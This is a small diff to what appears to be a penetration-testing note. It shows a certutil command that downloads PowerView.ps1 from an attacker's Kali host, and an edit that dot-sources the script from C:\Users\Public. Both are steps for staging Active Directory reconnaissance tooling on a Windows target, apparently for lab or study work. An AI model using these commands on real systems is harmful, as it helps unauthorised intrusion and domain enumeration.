@@ -13,9 +13,9 @@ const command = `certutil -urlcache -split -f http://${KaliIP}:80/PowerView.ps1 
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
+Dot Source
 ```powershell
-.\PowerView.ps1
+. C:\Users\Public\PowerView.ps1
 ```
 
 ---
